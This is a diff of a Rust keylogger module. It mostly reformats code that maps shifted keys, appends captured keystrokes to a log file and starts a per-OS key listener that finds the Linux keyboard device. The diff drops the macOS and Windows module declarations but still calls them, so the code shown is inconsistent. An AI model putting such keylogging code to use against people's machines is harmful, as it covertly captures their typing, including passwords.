@@ -1,13 +1,16 @@
-use std::{collections::HashMap, fs::{OpenOptions}, io::Write};
 use anyhow::Result;
+use std::{collections::HashMap, fs::OpenOptions, io::Write};
 #[cfg(target_os = "linux")]
 mod nix;
-#[cfg(target_os = "macos")]
-mod mac;
-#[cfg(target_os = "windows")]
-mod win;
 
-fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
+fn set_modifier(
+    key_char: &str,
+    shift: bool,
+    capslock: bool,
+    _ctrl: bool,
+    _option: bool,
+    _func: bool,
+) -> Result<String> {
     let shift_mapping: HashMap<&str, &str> = HashMap::from([
         ("1", "!"),
         ("2", "@"),
@@ -45,7 +48,7 @@ fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()
         .append(true)
         .create(true)
         .open(log_file)?;
-    
+
     write!(file, "{}\n", captured_keys_buffer)?;
     Ok(())
 }
@@ -54,23 +57,22 @@ pub(crate) fn start_eventlistener(log_file: String, timeout: u64) -> Result<()> 
     #[cfg(target_os = "linux")]
     {
         let keyboard_device_path = nix::nix_find_keyboard_device();
-        let _res = nix::nix_log_keys(keyboard_device_path.unwrap(), log_file, timeout);    
+        let _res = nix::nix_log_keys(keyboard_device_path.unwrap(), log_file, timeout);
     }
     #[cfg(target_os = "macos")]
     {
-        let _res = mac::mac_log_keys(log_file, timeout);    
+        let _res = mac::mac_log_keys(log_file, timeout);
     }
     #[cfg(target_os = "windows")]
     {
-        let _res = win::mac_log_keys(log_file, timeout);    
+        let _res = win::mac_log_keys(log_file, timeout);
     }
     Ok(())
 }
 
-
 #[cfg(test)]
 mod tests {
-    use std::io::{BufReader, BufRead};
+    use std::io::{BufRead, BufReader};
 
     use super::*;
     use tempfile::NamedTempFile;
